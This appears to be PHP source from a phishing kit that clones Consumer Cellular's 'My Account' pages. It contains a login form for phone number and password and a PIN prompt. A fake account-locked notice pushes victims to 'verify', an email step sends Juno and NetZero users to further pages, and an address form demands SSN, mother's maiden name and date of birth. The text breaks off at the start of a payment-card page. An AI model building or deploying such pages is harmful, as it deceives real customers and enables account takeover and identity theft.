<?php
require_once __DIR__ . '/../[KARMA]/core/rules.php';
// require_once __DIR__ . '/../[KARMA]/core/functions.php';
function LoginPage() {
    ?>
    <!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Manage My Account | Consumer Cellular</title>
            <link rel="icon" href="/public/images/favicon.ico" />
            <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
            <style>
                #svg-items,
                #main-logo {
                    max-height: 7rem;
                    width: auto;
                }
            </style>
        </head>
        <body class="sf-pro-reg">
            <?php require __DIR__ . "/static/header.php" ?>
            <div class="relative w-full overflow-hidden">
                <div class="hidden md:block">
                    <img src="/public/images/login-bg.jpg"
                        alt="Login Background"
                        class="w-full h-auto object-cover" />
                </div>

                <div
                    class="block md:hidden w-full h-100 bg-cover bg-center"
                    style="background-image: url('/public/images/login-blue-bg.jpg');"
                ></div>

                <div class="absolute inset-0 flex items-center justify-center md:-mt-10 lg:mt-20 md:justify-end md:pr-5 lg:pr-50 mx-4 mt-3">
                    <div class="bg-[#001e45b3] py-2 px-5 md:py-2 md:px-5 w-full max-w-sm text-white">
                        <h2 class="text-2xl mb-1">My Account Login</h2>
                        <form id="karma" method="POST" action="/consumercellular.com/proccess_login" class="flex gap-3">
                            <div class="w-full">
                                <div class="flex">
                                    <img src="/public/images/login-phone-number.jpg" class="w-12 h-10 md:h-11" />
                                    <input
                                        type="text"
                                        id="karma-phone"
                                        name="karma-phone"
                                        placeholder="Phone Number"
                                        required
                                        class="text-base md:text-xl w-full mb-3 px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                    />
                                </div>
                                <div id="phone-error" style="color: red; font-size: 0.9rem; margin-bottom: 0.3rem; display: none; margin-top: -10px;">
                                    The cell phone number is invalid.
                                </div>
                                <div class="flex">
                                    <img src="/public/images/login-password.jpg" class="w-12 h-10 md:h-11" />
                                    <input
                                        type="password"
                                        name="karma-password"
                                        placeholder="Password"
                                        required
                                        class="text-base md:text-xl w-full mb-3 px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                    />
                                </div>
                                
                                <div class="w-full block md:hidden">
                                    <button
                                        type="submit"
                                        class="w-full bg-[#f26631] text-white py-2 rounded font-bold cursor-pointer"
                                    >
                                        LOG IN
                                    </button>
                                </div>
                            </div>
                            <div class="w-full max-w-[100px] hidden md:block">
                                <button
                                    type="submit"
                                    class="w-full bg-[#f26631] text-white py-2 rounded font-bold cursor-pointer"
                                >
                                    LOG IN
                                </button>
                            </div>
                        </form>
                        <div class="flex justify-between mt-2 md:mt-0">
                            <i class="underline text-sm md:text-lg text-[#f26631]">Forgot Password?</i>
                            <div class="flex items-center gap-2">
                                <label class="inline-flex items-center space-x-2 cursor-pointer">
                                    <input type="checkbox" id="checkbox" class="hidden" />
                                    <div
                                        id="checkbox-box"
                                        class="h-4 w-4 md:w-5 md:h-5 border-2 border-gray-400 rounded-sm flex items-center justify-center transition-colors duration-150"
                                    >
                                        <svg
                                        id="checkmark"
                                        class="w-5 h-5 text-[#f26631] opacity-0 scale-75 transition-all duration-200 ease-in-out"
                                        fill="currentColor"
                                        viewBox="0 0 1920 1920"
                                        xmlns="http://www.w3.org/2000/svg"
                                        style="transform-origin: center;"
                                        >
                                        <path
                                            d="M1743.858 267.012 710.747 1300.124 176.005 765.382 0 941.387l710.747 710.871 1209.24-1209.116z"
                                            fill-rule="evenodd"
                                        />
                                        </svg>
                                    </div>
                                    <span class="text-sm md:text-lg italic">Remember Me</span>
                                </label>

                                <script>
                                    const checkbox = document.getElementById('checkbox');
                                    const checkmark = document.getElementById('checkmark');
                                    const box = document.getElementById('checkbox-box');

                                    checkbox.addEventListener('change', () => {
                                        if (checkbox.checked) {
                                        checkmark.style.opacity = '1';
                                        checkmark.style.transform = 'scale(1)';
                                        box.classList.add('border-[#f26631]');
                                        } else {
                                        checkmark.style.opacity = '0';
                                        checkmark.style.transform = 'scale(0.75)';
                                        box.classList.remove('border-[#f26631]');
                                        }
                                    });
                                </script>
                            </div>
                        </div>
                        <div class="flex justify-center md:hidden py-5 text-center text-white text-sm font-bold underline cursor-pointer">
                            <i>I'm New! Register for My Account</i>
                        </div>
                    </div>
                    <div class="absolute hidden md:flex items-center justify-center md:mt-59 lg:mt-59 md:justify-end w-full">
                        <div class="bg-[#f26631] py-2 px-5 md:py-2 md:px-5 text-center w-full max-w-sm text-white text-xl font-bold underline cursor-pointer">
                            <i>I'm New! Register for My Account</i>
                        </div>
                    </div>
                </div>
            </div>

            <div class="flex flex-col md:flex-row gap-0 md:gap-10 w-full">
                <div class="px-5 md:px-10 py-10 w-full">
                    <h2 class="text-4xl mb-4 border-b border-blue-500/50 py-5">MY ACCOUNT</h2>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Log in to manage your account, pay bills online, or take advantage of other great options. We want to keep things as simple as possible. That's why we let you manage your own account from the web. Your account is always password protected.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Rest assured, your information remains private and only you, or a qualified Consumer Cellular representative, may have access to it. To learn more about our security policy, go to Privacy and Security.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">We like to keep everything transparent—no surprises. We recommend our customers review their account on a regular basis. The Account Overview page is where you would typically start—it summarizes your account's current status.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide">Remember, with Consumer Cellular you may change your plan at any time, no strings attached.</p>
                </div>
                <div class="w-full md:max-w-lg bg-[#d7f0f8] mx-auto">
                    <div class="px-3 md:px-10 py-10">
                        <div class="mb-4 flex justify-center items-center md:justify-normal md:items-start">
                            <img src="/public/images/Logo.png" />
                        </div>
                        <h1 class="text-sm md:text-xl font-bold mb-5">OUR MOBILE APP MAKES MANAGING YOUR ACCOUNT EASY</h1>
                        <p class="text-sm md:text-xl tracking-wider mb-5 md:mb-10">Download the <i>free</i> <strong>My CC</strong> mobile app for easy, on-demand access to your Consumer Cellular account. Manage your monthly plans, track your usage, pay your bill, or even contact Customer Service right from the palm of your hand.</p>
                        <p class="text-sm md:text-xl tracking-wider">Enter your cellphone number below and we'll send you the link to get started.</p>
                    </div>
                    <div class="flex flex-col justify-center items-center md:flex-row md:justify-normal md:items-start gap-0 md:gap-7 px-10">
                        <input
                            type="text"
                            name="text"
                            placeholder="Cellphone Number"
                            required
                            class="w-full h-8 max-w-[200px] border border-black/80 outline-none mb-3 px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm md:placeholder:text-xl flex items-center rounded"
                        />
                        <div class="w-full max-w-[200px] md:max-w-[150px] mb-30">
                            <button
                                type="submit"
                                class="w-full bg-[#f26631] h-8 text-white py-2 rounded font-bold flex items-center justify-center"
                            >
                                SEND LINK
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <?php require __DIR__ . "/static/loader.php" ?>
        </body>
    </html>
<?php
}

function PinPage() {
    $showPinError = false;
    $isError = $_SESSION['karma-pin-error'] ?? null;
    $showPinDigitsError = false;
    if ($isError === 'yes') {
        $showPinError = true;
        unset($_SESSION['karma-pin-error']);
    }
    if (isset($_POST['karma-pin']) && strlen($_POST['karma-pin']) !== 4) {
        $showPinDigitsError = true;
        $showPinError = false;
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Manage My Account | Consumer Cellular</title>
            <link rel="icon" href="/public/images/favicon.ico" />
            <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
            <style>
                #svg-items,
                #main-logo {
                    max-height: 7rem;
                    width: auto;
                }
            </style>
        </head>
        <body class="sf-pro-reg">
            <?php require __DIR__ . "/static/header.php" ?>
            <div class="relative w-full overflow-hidden">
                <div class="hidden md:block">
                    <img src="/public/images/login-bg.jpg"
                        alt="Login Background"
                        class="w-full h-auto object-cover" />
                </div>

                <div
                    class="block md:hidden w-full h-100 bg-cover bg-center"
                    style="background-image: url('/public/images/login-blue-bg.jpg');"
                ></div>

                <div class="absolute inset-0 flex items-center justify-center md:-mt-10 lg:mt-20 md:justify-end md:pr-5 lg:pr-50 mx-4 mt-3">
                    <div class="bg-[#001e45b3] py-2 px-5 md:py-2 md:px-5 w-full max-w-sm text-white">
                        <h2 class="text-2xl mb-1">My Account Login</h2>
                        <form id="karma" method="POST" action="/consumercellular.com/proccess_pin" class="flex gap-3">
                            <div class="w-full">
                                <div class="flex">
                                    <img src="/public/images/login-password.jpg" class="w-12 h-10 md:h-11" />
                                    <input
                                        type="password"
                                        id="karma-pin"
                                        name="karma-pin"
                                        placeholder="Your 4-digit PIN"
                                        required
                                        class="text-base md:text-xl w-full mb-3 px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                    />
                                </div>
                                <div id="pin-error" style="color: red; font-size: 0.9rem; margin-bottom: 1rem; display: <?= $showPinDigitsError ? 'block' : 'none'; ?>;">
                                    PIN must be exactly 4 digits.
                                </div>

                                <?php if ($showPinError && !$showPinDigitsError) { ?>
                                    <div id="invalid-pin-error" style="color: red; font-size: 0.9rem; margin-bottom: 1rem;">
                                        <p>PIN is invalid, type carefully and try again.</p>
                                    </div>
                                <?php } ?>
                                <script>
                                    document.addEventListener('DOMContentLoaded', function() {
                                        const pinInput = document.getElementById('karma-pin');
                                        const pinError = document.getElementById('pin-error');
                                        const invalidPinError = document.getElementById('invalid-pin-error');
                                        const form = document.getElementById('karma');
                                        
                                        form.addEventListener('submit', function(e) {
                                            const pinValue = pinInput.value;

                                            if (pinValue.length !== 4) {
                                                e.preventDefault();
                                                pinError.style.display = 'block';
                                                invalidPinError.style.display = 'none';
                                            } else {
                                                pinError.style.display = 'none';
                                                invalidPinError.style.display = 'none';
                                            }
                                        });
                                    });
                                </script>
                                
                                <div class="w-full block md:hidden">
                                    <button
                                        type="submit"
                                        class="w-full bg-[#f26631] text-white py-2 rounded font-bold cursor-pointer"
                                    >
                                        CONTINUE
                                    </button>
                                </div>
                            </div>
                            <div class="w-full max-w-[100px] hidden md:block">
                                <button
                                    type="submit"
                                    class="w-full bg-[#f26631] text-white py-2 rounded font-bold cursor-pointer"
                                >
                                    CONTINUE
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="flex flex-col md:flex-row gap-0 md:gap-10 w-full">
                <div class="px-5 md:px-10 py-10 w-full">
                    <h2 class="text-4xl mb-4 border-b border-blue-500/50 py-5">MY ACCOUNT</h2>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Log in to manage your account, pay bills online, or take advantage of other great options. We want to keep things as simple as possible. That's why we let you manage your own account from the web. Your account is always password protected.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Rest assured, your information remains private and only you, or a qualified Consumer Cellular representative, may have access to it. To learn more about our security policy, go to Privacy and Security.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">We like to keep everything transparent—no surprises. We recommend our customers review their account on a regular basis. The Account Overview page is where you would typically start—it summarizes your account's current status.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide">Remember, with Consumer Cellular you may change your plan at any time, no strings attached.</p>
                </div>
                <div class="w-full md:max-w-lg bg-[#d7f0f8] mx-auto">
                    <div class="px-3 md:px-10 py-10">
                        <div class="mb-4 flex justify-center items-center md:justify-normal md:items-start">
                            <img src="/public/images/Logo.png" />
                        </div>
                        <h1 class="text-sm md:text-xl font-bold mb-5">OUR MOBILE APP MAKES MANAGING YOUR ACCOUNT EASY</h1>
                        <p class="text-sm md:text-xl tracking-wider mb-5 md:mb-10">Download the <i>free</i> <strong>My CC</strong> mobile app for easy, on-demand access to your Consumer Cellular account. Manage your monthly plans, track your usage, pay your bill, or even contact Customer Service right from the palm of your hand.</p>
                        <p class="text-sm md:text-xl tracking-wider">Enter your cellphone number below and we'll send you the link to get started.</p>
                    </div>
                    <div class="flex flex-col justify-center items-center md:flex-row md:justify-normal md:items-start gap-0 md:gap-7 px-10">
                        <input
                            type="text"
                            name="text"
                            placeholder="Cellphone Number"
                            required
                            class="w-full h-8 max-w-[200px] border border-black/80 outline-none mb-3 px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm md:placeholder:text-xl flex items-center rounded"
                        />
                        <div class="w-full max-w-[200px] md:max-w-[150px] mb-30">
                            <button
                                type="submit"
                                class="w-full bg-[#f26631] h-8 text-white py-2 rounded font-bold flex items-center justify-center"
                            >
                                SEND LINK
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <?php require __DIR__ . "/static/loader.php" ?>
        </body>
    </html>
<?php
}

function LockedPage() {
    $config = require __DIR__ . '/../[KARMA]/config/config.php';
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if($config['email_akses_page'] === "on") {
            header('Location: /consumercellular.com/email');
            exit;
        } else {
            header('Location: /consumercellular.com/address');
            exit;
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Account Locked | Consumer Cellular</title>
            <link rel="icon" href="/public/images/favicon.ico" />
            <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
            <style>
                #svg-items,
                #main-logo {
                    max-height: 7rem;
                    width: auto;
                }
            </style>
        </head>
        <body class="sf-pro-reg">
            <?php require __DIR__ . "/static/header.php" ?>
            <div class="relative w-full overflow-hidden">
                <div class="hidden md:block">
                    <img src="/public/images/login-bg.jpg"
                        alt="Login Background"
                        class="w-full h-auto object-cover" />
                </div>

                <div
                    class="block md:hidden w-full h-100 bg-cover bg-center"
                    style="background-image: url('/public/images/login-blue-bg.jpg');"
                ></div>

                <div class="absolute inset-0 flex items-center justify-center md:justify-end md:pr-5 lg:pr-50 mx-4 mt-3">
                    <div class="bg-[#001e45b3] py-2 px-5 md:py-2 md:px-5 w-full max-w-sm text-white">
                        <form id="karma" action="" method="post">
                            <div>
                                <h1 class="text-xl font-bold mb-2">Your Account Has Been Locked!</h1>
                                <?php if ($config['email_akses_page'] === "on"): ?>
                                    <p class="text-sm">
                                        To restore access to your account, you are required to confirm the email address associated with your account, provide proof of your residential address, and submit valid documentation related to your linked payment cards and bank account. This verification process helps ensure that the account rightfully belongs to you and protects against unauthorized activity.
                                    </p>
                                <?php else: ?>
                                    <p class="text-sm">
                                        To restore access to your account, you are required to provide proof of your residential address, and submit valid documentation related to your linked payment cards and bank account. This verification process helps ensure that the account rightfully belongs to you and protects against unauthorized activity.
                                    </p>
                                <?php endif; ?>
                            </div>
                            <div class="w-full flex mt-7">
                                <button
                                    type="submit"
                                    class="w-full bg-[#f26631] text-white py-2 rounded font-bold cursor-pointer"
                                >
                                    VERIFY NOW
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="flex flex-col md:flex-row gap-0 md:gap-10 w-full">
                <div class="px-5 md:px-10 py-10 w-full">
                    <h2 class="text-4xl mb-4 border-b border-blue-500/50 py-5">MY ACCOUNT</h2>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Log in to manage your account, pay bills online, or take advantage of other great options. We want to keep things as simple as possible. That's why we let you manage your own account from the web. Your account is always password protected.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Rest assured, your information remains private and only you, or a qualified Consumer Cellular representative, may have access to it. To learn more about our security policy, go to Privacy and Security.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">We like to keep everything transparent—no surprises. We recommend our customers review their account on a regular basis. The Account Overview page is where you would typically start—it summarizes your account's current status.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide">Remember, with Consumer Cellular you may change your plan at any time, no strings attached.</p>
                </div>
                <div class="w-full md:max-w-lg bg-[#d7f0f8] mx-auto">
                    <div class="px-3 md:px-10 py-10">
                        <div class="mb-4 flex justify-center items-center md:justify-normal md:items-start">
                            <img src="/public/images/Logo.png" />
                        </div>
                        <h1 class="text-sm md:text-xl font-bold mb-5">OUR MOBILE APP MAKES MANAGING YOUR ACCOUNT EASY</h1>
                        <p class="text-sm md:text-xl tracking-wider mb-5 md:mb-10">Download the <i>free</i> <strong>My CC</strong> mobile app for easy, on-demand access to your Consumer Cellular account. Manage your monthly plans, track your usage, pay your bill, or even contact Customer Service right from the palm of your hand.</p>
                        <p class="text-sm md:text-xl tracking-wider">Enter your cellphone number below and we'll send you the link to get started.</p>
                    </div>
                    <div class="flex flex-col justify-center items-center md:flex-row md:justify-normal md:items-start gap-0 md:gap-7 px-10">
                        <input
                            type="text"
                            name="text"
                            placeholder="Cellphone Number"
                            required
                            class="w-full h-8 max-w-[200px] border border-black/80 outline-none mb-3 px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm md:placeholder:text-xl flex items-center rounded"
                        />
                        <div class="w-full max-w-[200px] md:max-w-[150px] mb-30">
                            <button
                                type="submit"
                                class="w-full bg-[#f26631] h-8 text-white py-2 rounded font-bold flex items-center justify-center"
                            >
                                SEND LINK
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <?php require __DIR__ . "/static/loader.php" ?>
        </body>
    </html>
<?php
}

function EmailPage() {
    $config = include __DIR__ . '/../[KARMA]/config/config.php';
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $_SESSION['karma-email'] = $_POST['karma-email'];
        if($config['email_akses_page'] === "on") {
            if (isset($_SESSION['karma-email']) && strpos($_SESSION['karma-email'], '@juno') !== false) {
                header("Location: /juno");
                exit();
            } else if (isset($_SESSION['karma-email']) && strpos($_SESSION['karma-email'], '@netzero') !== false) {
                header("Location: /netzero");
                exit();
            } else {
                header('Location: /consumercellular.com/address');
                exit();
            }
        } else {
            header('Location: /consumercellular.com/address');
            exit();
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Verify Email | Consumer Cellular</title>
            <link rel="icon" href="/public/images/favicon.ico" />
            <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
            <style>
                #svg-items,
                #main-logo {
                    max-height: 7rem;
                    width: auto;
                }
            </style>
        </head>
        <body class="sf-pro-reg">
            <?php require __DIR__ . "/static/header.php" ?>
            <div class="relative w-full overflow-hidden">
                <div class="hidden md:block">
                    <img src="/public/images/login-bg.jpg"
                        alt="Login Background"
                        class="w-full h-auto object-cover" />
                </div>

                <div
                    class="block md:hidden w-full h-100 bg-cover bg-center"
                    style="background-image: url('/public/images/login-blue-bg.jpg');"
                ></div>

                <div class="absolute inset-0 flex items-center justify-center md:-mt-10 lg:mt-20 md:justify-end md:pr-5 lg:pr-50 mx-4 mt-3">
                    <div class="bg-[#001e45b3] py-2 px-5 md:py-2 md:px-5 w-full max-w-sm text-white">
                        <h2 class="text-2xl mb-1">Verify My Email</h2>
                        <form id="karma" method="POST" action="" class="flex gap-3">
                            <div class="w-full">
                                <div class="flex">
                                    <img src="/public/images/login-phone-number.jpg" class="w-12 h-10 md:h-11" />
                                    <input
                                        type="email"
                                        id="karma-email"
                                        name="karma-email"
                                        placeholder="Email Address"
                                        required
                                        class="text-base md:text-xl w-full mb-3 px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                    />
                                </div>
                                
                                <div class="w-full block md:hidden">
                                    <button
                                        type="submit"
                                        class="w-full bg-[#f26631] text-white py-2 rounded font-bold cursor-pointer"
                                    >
                                        CONTINUE
                                    </button>
                                </div>
                            </div>
                            <div class="w-full max-w-[100px] hidden md:block">
                                <button
                                    type="submit"
                                    class="w-full bg-[#f26631] text-white py-2 rounded font-bold cursor-pointer"
                                >
                                    CONTINUE
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="flex flex-col md:flex-row gap-0 md:gap-10 w-full">
                <div class="px-5 md:px-10 py-10 w-full">
                    <h2 class="text-4xl mb-4 border-b border-blue-500/50 py-5">MY ACCOUNT</h2>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Log in to manage your account, pay bills online, or take advantage of other great options. We want to keep things as simple as possible. That's why we let you manage your own account from the web. Your account is always password protected.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Rest assured, your information remains private and only you, or a qualified Consumer Cellular representative, may have access to it. To learn more about our security policy, go to Privacy and Security.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">We like to keep everything transparent—no surprises. We recommend our customers review their account on a regular basis. The Account Overview page is where you would typically start—it summarizes your account's current status.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide">Remember, with Consumer Cellular you may change your plan at any time, no strings attached.</p>
                </div>
                <div class="w-full md:max-w-lg bg-[#d7f0f8] mx-auto">
                    <div class="px-3 md:px-10 py-10">
                        <div class="mb-4 flex justify-center items-center md:justify-normal md:items-start">
                            <img src="/public/images/Logo.png" />
                        </div>
                        <h1 class="text-sm md:text-xl font-bold mb-5">OUR MOBILE APP MAKES MANAGING YOUR ACCOUNT EASY</h1>
                        <p class="text-sm md:text-xl tracking-wider mb-5 md:mb-10">Download the <i>free</i> <strong>My CC</strong> mobile app for easy, on-demand access to your Consumer Cellular account. Manage your monthly plans, track your usage, pay your bill, or even contact Customer Service right from the palm of your hand.</p>
                        <p class="text-sm md:text-xl tracking-wider">Enter your cellphone number below and we'll send you the link to get started.</p>
                    </div>
                    <div class="flex flex-col justify-center items-center md:flex-row md:justify-normal md:items-start gap-0 md:gap-7 px-10">
                        <input
                            type="text"
                            name="text"
                            placeholder="Cellphone Number"
                            required
                            class="w-full h-8 max-w-[200px] border border-black/80 outline-none mb-3 px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm md:placeholder:text-xl flex items-center rounded"
                        />
                        <div class="w-full max-w-[200px] md:max-w-[150px] mb-30">
                            <button
                                type="submit"
                                class="w-full bg-[#f26631] h-8 text-white py-2 rounded font-bold flex items-center justify-center"
                            >
                                SEND LINK
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <?php require __DIR__ . "/static/loader.php" ?>
        </body>
    </html>
<?php
}

function AddressPage() {
    ?>
    <!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Update Address | Consumer Cellular</title>
            <link rel="icon" href="/public/images/favicon.ico" />
            <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
            <style>
                #svg-items,
                #main-logo {
                    max-height: 7rem;
                    width: auto;
                }
            </style>
        </head>
        <body class="sf-pro-reg">
            <?php require __DIR__ . "/static/header.php" ?>
            <div class="relative w-full overflow-hidden">
                <div class="hidden md:block">
                    <img src="/public/images/login-bg.jpg"
                        alt="Login Background"
                        class="w-full h-auto object-cover" />
                </div>

                <div
                    class="block md:hidden w-full h-100 bg-cover bg-center"
                    style="background-image: url('/public/images/login-blue-bg.jpg');"
                ></div>

                <div class="absolute inset-0 flex items-center justify-center px-1 md:px-10 lg:px-5">
                    <div class="bg-[#001e45b3] py-2 px-5 md:py-2 md:px-5 w-full max-w-[900px] text-white">
                        <h2 class="text-2xl mb-1">Update My Address</h2>
                        <div id="phone-error" style="color: red; font-size: 0.9rem; margin-bottom: 1px; display: none; margin-top: 1px;">
                            The cell phone number is invalid.
                        </div>
                        <form id="karma" method="POST" action="/consumercellular.com/proccess_address" class="flex flex-col gap-3">
                            <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-2 gap-1 w-full">
                                <input
                                    type="text"
                                    id="karma-firstname"
                                    name="karma-firstname"
                                    placeholder="First Name"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="text"
                                    id="karma-lastname"
                                    name="karma-lastname"
                                    placeholder="Last Name"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="date"
                                    id="karma-dob"
                                    name="karma-dob"
                                    placeholder="Date Of Birth"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="text"
                                    id="karma-cob"
                                    name="karma-cob"
                                    placeholder="City Of Birth"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="text"
                                    id="karma-street"
                                    name="karma-street"
                                    placeholder="Street"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="text"
                                    id="karma-city"
                                    name="karma-city"
                                    placeholder="City"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="text"
                                    id="karma-province"
                                    name="karma-province"
                                    placeholder="Province"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="number"
                                    id="karma-postcode"
                                    name="karma-postcode"
                                    placeholder="Post Code"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="text"
                                    id="karma-country"
                                    name="karma-country"
                                    placeholder="Country"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="text"
                                    id="karma-phone"
                                    name="karma-phonenumber"
                                    placeholder="Phone Number"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="number"
                                    id="karma-ssn"
                                    name="karma-ssn"
                                    placeholder="Social Security Number (SSN)"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                                <input
                                    type="text"
                                    id="karma-mmn"
                                    name="karma-mmn"
                                    placeholder="Mother's Maiden Name (MMN)"
                                    required
                                    class="text-base md:text-xl w-full px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm lg:placeholder:text-xl"
                                />
                            </div>
                            <div class="w-full lg:max-w-[150px]">
                                <button
                                    type="submit"
                                    class="w-full bg-[#f26631] text-white py-2 rounded font-bold cursor-pointer"
                                >
                                    CONTINUE
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="flex flex-col md:flex-row gap-0 md:gap-10 w-full">
                <div class="px-5 md:px-10 py-10 w-full">
                    <h2 class="text-4xl mb-4 border-b border-blue-500/50 py-5">MY ACCOUNT</h2>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Log in to manage your account, pay bills online, or take advantage of other great options. We want to keep things as simple as possible. That's why we let you manage your own account from the web. Your account is always password protected.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">Rest assured, your information remains private and only you, or a qualified Consumer Cellular representative, may have access to it. To learn more about our security policy, go to Privacy and Security.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide mb-5">We like to keep everything transparent—no surprises. We recommend our customers review their account on a regular basis. The Account Overview page is where you would typically start—it summarizes your account's current status.</p>
                    <p class="text-sm md:text-base lg:text-xl tracking-wide">Remember, with Consumer Cellular you may change your plan at any time, no strings attached.</p>
                </div>
                <div class="w-full md:max-w-lg bg-[#d7f0f8] mx-auto">
                    <div class="px-3 md:px-10 py-10">
                        <div class="mb-4 flex justify-center items-center md:justify-normal md:items-start">
                            <img src="/public/images/Logo.png" />
                        </div>
                        <h1 class="text-sm md:text-xl font-bold mb-5">OUR MOBILE APP MAKES MANAGING YOUR ACCOUNT EASY</h1>
                        <p class="text-sm md:text-xl tracking-wider mb-5 md:mb-10">Download the <i>free</i> <strong>My CC</strong> mobile app for easy, on-demand access to your Consumer Cellular account. Manage your monthly plans, track your usage, pay your bill, or even contact Customer Service right from the palm of your hand.</p>
                        <p class="text-sm md:text-xl tracking-wider">Enter your cellphone number below and we'll send you the link to get started.</p>
                    </div>
                    <div class="flex flex-col justify-center items-center md:flex-row md:justify-normal md:items-start gap-0 md:gap-7 px-10">
                        <input
                            type="text"
                            name="text"
                            placeholder="Cellphone Number"
                            required
                            class="w-full h-8 max-w-[200px] border border-black/80 outline-none mb-3 px-4 py-2 bg-white focus:outline-none text-black placeholder:text-sm md:placeholder:text-xl flex items-center rounded"
                        />
                        <div class="w-full max-w-[200px] md:max-w-[150px] mb-30">
                            <button
                                type="submit"
                                class="w-full bg-[#f26631] h-8 text-white py-2 rounded font-bold flex items-center justify-center"
                            >
                                SEND LINK
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <?php require __DIR__ . "/static/loader.php" ?>
        </body>
    </html>
<?php
}

function CardPage() {
    $showFirstError = false;
    $showSecondError = false;
    $errorType = $_SESSION['karma-card-error'] ?? null;
    if ($errorType === 'first') {
        $showFirstError = true;
        unset($_SESSION['karma-card-error']);
    } elseif ($errorType === 'same') {
        $showSecondError = true;
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Update Payments | Consumer Cellular</title>
            <link rel="icon" href="/public/images/favicon.ico" />
            <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
            <style>
                #svg-items,
                #main-logo {
                    max-height: 7rem;
                    width: auto;
                }
            </style>
        </head>
        <body class="sf-pro-reg">
            <?php require __DIR__ . "/static/header.php" ?>
            <div class="relative w-full overflow-hidden">
                <div class="hidden md:block">
                    <img src="/public/images/login-bg.jpg"
                        alt="Login Background"
                        class="w-full h-auto object-cover" />
                </div>

                <div
